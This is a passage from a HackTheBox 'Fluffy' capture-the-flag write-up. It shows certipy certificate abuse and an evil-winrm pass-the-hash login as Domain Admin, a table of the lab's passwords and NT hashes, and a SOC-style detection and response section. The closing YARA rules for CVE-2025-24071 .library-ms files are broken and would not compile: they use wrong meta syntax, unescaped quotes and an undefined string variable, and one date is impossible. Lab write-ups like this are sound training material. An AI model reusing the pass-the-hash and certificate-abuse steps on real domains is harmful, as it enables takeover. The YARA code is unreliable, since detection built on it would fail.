──(teja㉿x50ubr)-[~/…/Machines/Retired/Fluffy/certs]
└─$ certipy-ad auth -dc-ip 10.10.11.69 -pfx administrator.pfx -username administrator -domain fluffy.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e

```


We got hash , and now we use this hash to authenticate 
```bash
┌──(teja㉿x50ubr)-[~/…/Machines/Retired/Fluffy/tmp]
└─$ evil-winrm -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e -i 10.10.11.69 

Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                  
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                             
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       12/28/2025   8:28 AM             34 root.txt
```

And voila

### Secrets

| Application   | Username / Email | Password                         |
| ------------- | ---------------- | -------------------------------- |
| ACCOUNT CREDS | j.fleischman     | J0elTHEM4n1990!                  |
| ACCOUNT CREDS | p.agila          | prometheusx-303                  |
| NT HASH       | ldap_svc         | 22151d74ba3de931a352cba1f9393a37 |
| NT HASH       | winrm_svc        | 33bd09dcd697600edf6b3a7af4875767 |
| NT HASH       | ca_svc           | ca0f4f9e9eb8a092addf53bb03fc98c8 |
| NT HASH       | administrator    | 8da83a3fa618b6e3a00e93f676c92a6e |

## Defensive Perspective - Behind The Scenes SOC Analyst

**`How the same attack would look in a real environment, how to detect it, respond to it, and prevent it.`**

###  1. What actually happened

- **`Enumeration`**: Initial access began with provided domain credentials. Network scanning identified the target as a Domain Controller through Kerberos, LDAP, and Global Catalog services. LDAP enumeration and BloodHound analysis revealed service accounts and ACL-based attack paths.

- **`Exploitation`**: Writable SMB share (IT) was abused to drop a malicious `.library-ms` payload, exploiting CVE-2025-24071 to coerce NTLM authentication and capture service account credentials.

- **`Privilege Escalation`**: Cracked credentials of `p.agila` allowed GenericWrite abuse over service accounts. Multiple escalation attempts were tested (shadow credentials, password reset, SPN roasting). Ultimately, AD CS ESC16 misconfiguration was exploited to impersonate the Administrator account via certificate abuse.

- **`Post-Exploitation`**: Administrator NT hash was retrieved and used with Evil-WinRM to gain full Domain Admin access.

**Final Flags**: `root.txt` retrieved from Administrator desktop.

---
### 2. Incident Story (SOC Style)

| **Attack Step (Attacker View)**                  | **What It Looks Like to SOC / Blue Team**             | **Relevant Windows Event IDs / Logs**           |
| ------------------------------------------------ | ----------------------------------------------------- | ----------------------------------------------- |
| Use of valid domain credentials (`j.fleischman`) | Normal interactive/network logon from expected subnet | 4624 (Logon), 4634 (Logoff)                     |
| LDAP enumeration of domain objects               | High-volume LDAP queries, directory service access    | 1644 (LDAP query logging), 4662 (Object access) |
| BloodHound data collection                       | Burst of LDAP, SMB, RPC calls in short time window    | 1644, 4662, 5140                                |
| Kerberoasting attempts                           | Multiple TGS requests for service accounts            | 4769 (Kerberos TGS requested)                   |
| Access to writable SMB share                     | Internal share access, file enumeration               | 5140 (SMB share accessed)                       |
| Upload of ZIP containing `.library-ms`           | File creation with uncommon extension                 | 5145 (File write), 4663 (File access)           |
| Triggering `.library-ms` file                    | Outbound SMB authentication to non-domain host        | 4624 (Type 3), 4776 (NTLM auth)                 |
| NTLM hash capture                                | NTLM authentication successes/failures                | 4776 (NTLM authentication)                      |
| Offline hash cracking                            | No host visibility (off-host activity)                | ❌ No logs                                       |
| Authentication as `p.agila`                      | New user context authenticating from same host        | 4624, 4672 (Special privileges assigned)        |
| GenericWrite abuse on service accounts           | LDAP attribute modifications on AD objects            | 5136 (Directory Service Changes)                |
| Shadow credential attempt                        | `msDS-KeyCredentialLink` modification attempts        | 5136                                            |
| Password reset attempt                           | Password change/reset on service account              | 4723 (Password change), 4724 (Reset)            |
| Fake SPN assignment                              | SPN attribute modified on service account             | 5136                                            |
| AD CS template enumeration                       | Certificate service enumeration activity              | 4886 (Certificate Services queried)             |
| ESC16 certificate request                        | Certificate issued to unexpected principal            | 4886 (Request), 4887 (Issued)                   |
| Certificate-based logon as Administrator         | Logon without password, cert-based auth               | 4624, 4768 (Kerberos TGT)                       |
| NT hash extraction                               | Credential material access (LSASS interaction)        | 4688 (Process creation), Sysmon 10              |
| Pass-the-Hash via Evil-WinRM                     | WinRM logon as Administrator                          | 4624 (Type 3), 4648                             |
| Domain compromise achieved                       | DA-level actions across domain                        | 4672, 4728 / 4732                               |

---
### 3. MITRE ATT&CK 
#### Discovery / Enumeration

- **`T1046 – Network Service Discovery`**  - Identified LDAP, Kerberos, SMB, GC services.
- **`T1087 – Account Discovery`**  - Enumerated users and service accounts via LDAP/BloodHound. 
- **`T1069.002 – Permission Groups Discovery: Domain Groups`**  - Identified group memberships and delegated permissions.
- **`T1018 – Remote System Discovery`**  - Confirmed Domain Controller role.
- **`T1482 – Domain Trust Discovery`**  - Implicit during domain-wide LDAP/BloodHound enumeration.

#### Credential Access

- **`T1557.001 – Adversary-in-the-Middle: NTLM Credential Interception`**  - `.library-ms` abuse (CVE-2025-24071) coerced NTLM authentication.
- **`T1003 – OS Credential Dumping`**  - NT hash usage post-compromise.
- **`T1110 – Brute Force (Offline)`**  - Offline NTLM hash cracking (low visibility to SOC).

#### Lateral Movement / Authentication Abuse

- **`T1550.003 – Use Alternate Authentication Material: Pass-the-Hash`**  - Used NT hash with Evil-WinRM.
- **`T1021.006 – Remote Services: WinRM`**  - Remote admin access via WinRM.
    
#### Privilege Escalation

- **`T1068 – Exploitation for Privilege Escalation`**  - Logical exploitation of AD misconfigurations.
- **`T1098 – Account Manipulation`**  - GenericWrite abuse over service accounts.
- **`T1484.001 – Domain Policy Modification: Group Policy / Object Attributes`**  - Attribute modification (UPN, SPN, msDS-KeyCredentialLink).
- **`T1558.003 – Kerberos Ticket Abuse: Kerberoasting`**  - Fake SPN + TGS dumping attempts.
    
#### Defense Evasion

- **`T1036 – Masquerading`**  - Certificate-based impersonation of Administrator.
- **`T1070.006 – Indicator Removal on Host: Credential Material`**  - Certificate-based auth avoids password-based detections.
    
#### Persistence

- **`T1649 – Steal or Forge Authentication Certificates`**  - ESC16 abuse via AD CS — stealthy, long-term persistence.
- **`T1098.004 – Account Manipulation: Certificate Authentication`**  - Certificate remains valid even after password resets.
    
#### Impact

- **`T1489 – Service Stop (Potential)`**  - Domain Admin capability implies service disruption potential.
- **`T1490 – Inhibit System Recovery (Potential)`**  - Full domain compromise enables backup/DR impact.

---
### 4. How to Prevent it

- We disable NTLM because we abused NTLM coercion using a `.library-ms` file to leak credentials.
- We block outbound NTLM because the Domain Controller authenticated back to our attacker machine.
- We restrict SMB write access because we uploaded a malicious ZIP into the `IT` share.
- We block `.library-ms` files because this exact file type triggered the NTLM hash leak.
- We enforce least privilege because a low-privileged user (`p.agila`) could modify service accounts.
- We remove `GenericWrite` because it allowed us to change attributes on multiple service accounts.
- We use gMSA because normal service accounts allowed password and hash abuse.
- We prevent UPN modification because we changed the UPN to impersonate the Administrator.
- We prevent SPN modification because we added fake SPNs to attempt Kerberoasting.
- We monitor LDAP changes because service account attributes were modified during escalation attempts.
- We harden AD CS because ESC16 let us obtain a certificate as Administrator.
- We remove vulnerable certificate templates because misconfigured templates enabled impersonation.
- We require certificate approval because certificates were issued without any human validation.
- We monitor certificate-based logons because we authenticated as Administrator without a password.
- We restrict WinRM because we used Evil-WinRM for Domain Admin access.
- We centralize DC and AD CS logs because the attack chain spanned SMB, LDAP, Kerberos, and PKI.
- We alert on abnormal Kerberos traffic because we requested TGS tickets for non-standard accounts.
- We protect Tier-0 assets because a workstation-level user eventually reached Domain Admin.
- We separate admin credentials because one compromised identity led to full domain takeover.

---
### 5. Incident Response Flow

#### Phase 1 - Preparation

- We ensure logging is enabled for SMB, LDAP, WinRM, and AD CS activities.    
- We configure SIEM to collect Domain Controller, certificate, and file share events.
- We maintain clean backups and snapshots of AD, servers, and AD CS configurations.
- We define alert rules for NTLM abuse, unusual certificate enrollments, and LDAP modifications.
- We ensure playbooks exist for credential theft, certificate abuse, and service account compromise scenarios.
- We train SOC analysts to recognize suspicious AD CS activity and lateral movement attempts.

#### Phase 2 – Identification

- We monitor for unusual NTLM authentication coming from internal SMB shares.
- We should observe outbound NTLM connections to unknown hosts.
- We should detect SMB uploads, especially ZIP files or `.library-ms` files.
- We monitor certificate enrollments from non-admin accounts for anomalies.
- We should correlate SMB uploads, NTLM authentication, and LDAP changes in real time. 
- We identify which accounts are affected (e.g., `j.fleischman`, `p.agila`).
- We should check AD CS logs to confirm if certificate abuse is occurring.
- We classify the incident as **potential identity compromise with domain admin escalation**.
    
#### Phase 3 – Containment

- We disable the compromised accounts immediately.
- We revoke any certificates issued during the suspicious activity.
- We block outbound NTLM authentication to prevent further credential leaks.
- We restrict write access on the `IT` SMB share.
- We limit WinRM access to approved administrative accounts only.
    
#### Phase 4 – Eradication

- We remove malicious `.library-ms` files or other uploaded payloads from SMB shares.
- We reset passwords for all affected accounts.
- We revert unauthorized changes to UPN, SPN, and service account attributes.
- We fix vulnerable AD CS templates and remove ESC16 misconfigurations.
- We remove unnecessary GenericWrite permissions from non-admin users.
    
#### Phase 5 – Recovery

- We restore accounts with clean credentials.
- We verify AD CS integrity and certificate trust.
- We monitor Kerberos, LDAP, and certificate activity closely to ensure no lingering compromise.
- We confirm SMB shares and WinRM services are secured for normal operations.
    
#### Phase 6 – Lessons Learned

- We identify NTLM and AD CS as critical attack surfaces to secure.
- We update SMB and identity security baselines.
- We enhance SOC detection for certificate-based attacks.
- We plan tabletop exercises simulating identity-based compromise.
- We document the full attack chain, detection points, and response actions for future incidents.

---
### 6. Yara Rules

#### A rule for detecting malicious windows library file 

```yar
rule suspiciousSMBFileUpload {
	
	meta:
		description: "Detecting malicious .library-ms files get processed and which sends NTLM authentication hashes when visiting external SMB shares"
		author: "Pavan Mandapakala"
		reference: "CVE-2025-24071"
		date: "2028-12-2025"
		
	
	strings: 
		$xmlHeader = "<?xml version="1.0" encoding="UTF-8"?>"
		$libraryDescription = "<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">"
		$searchConnectorTag = "<searchConnectorDescriptionList>"
		$remoteURL = "<url>\\\\([0-9]{1,3}\.){3}[0-9]{1,3}[^<]*<\/url>"
	
	condition: 
		all of ($xmlHeader, $libraryDescription, $searchConnectorString, $remoteURL)
}
```

#### A rule for detecting zip files with malicious windows library files

```
rule maliciousZipFiles {
	meta:
		description: "Detecting zip files with malicious windows library files"
		author: "Pavan Mandapakala"
		reference: "CVE-2025-24071"
		date: "28-12-2025"
		
	strings:
		$xmlHeader = "<?xml version="1.0" encoding="UTF-8"?>"
		$libraryDescription = "<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">"
		$searchConnectorTag = "<searchConnectorDescriptionList>"
		$remoteURL = "<url>\\\\([0-9]{1,3}\.){3}[0-9]{1,3}[^<]*<\/url>"
		$zipMagicBytes = { 50 4B 03 04 }
		$libraryExtension = ".library-ms" 
	
	condition:
		all of ($xmlHeader, $libraryDescription, $searchConnectorString, $remoteURL) and $zipMagicBytes at 0 and $libraryExtension
}
```



